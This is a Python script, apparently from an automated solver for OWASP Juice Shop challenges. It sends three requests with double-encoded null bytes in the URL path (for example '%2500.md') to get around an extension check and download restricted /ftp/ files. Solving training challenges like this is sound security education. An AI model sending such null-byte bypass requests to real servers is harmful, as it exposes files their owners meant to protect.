"""
This file is used to solve the OWASP Juice-shop Task POISON NULLBYTE
EASTER EGG
FORGETTEN DEVELOPER Backup
MISPLACED SIGNATURE FILE
NullByte Injection is to inject on URI to download files besides extension with "md" and "pdf"checking.
"""
import time
from . import attack as a


class poisonNullByte(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL

    def generator(self):
        pass

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("poisonNullByte")
        a.logging.Formatter.converter = time.gmtime
        a.logging.info(logger)
        a.logging.info('EasterEgg Started')
        response = self.juice_session.get(self.url+'/ftp/eastere.gg%25%30%30%2e%70%64%66')
        a.logging.info('EasterEgg Finished')

        a.logging.info('Forgotten Developer Backup Started')
        response = self.juice_session.get(self.url+'/ftp/package.json.bak%25%30%30.md')
        a.logging.info('Forgotten Developer Backup Finished')

        a.logging.info('Misplaced Signature File Started')
        response = self.juice_session.get(self.url+'/ftp/suspicious_errors.yml%2500.md')
        a.logging.info('Misplaced Signature File Finished')